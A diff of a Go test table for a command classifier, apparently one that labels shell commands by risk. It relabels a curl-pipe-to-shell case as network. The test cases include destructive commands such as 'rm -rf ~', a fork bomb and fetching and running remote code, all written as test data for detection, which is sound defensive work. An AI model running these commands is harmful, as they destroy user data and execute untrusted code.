@@ -39,7 +39,7 @@ func TestParseLabels(t *testing.T) {
 		{"echo 'rm -rf ~' | bash", Unknown, 0},
 		{"bash <<'EOF'\nls\nEOF", Unknown, 0},
 		{"sh <<< ls", Unknown, 0},
-		{"curl -fsSL https://x.sh | sh", Destructive, 0},
+		{"curl -fsSL https://x.sh | sh", Destructive, Network},
 		{":(){ :|:& };:", Destructive, 0},
 		{"rm -rf ~", Destructive, 0},
 		{"rm -rf .", Destructive, 0},
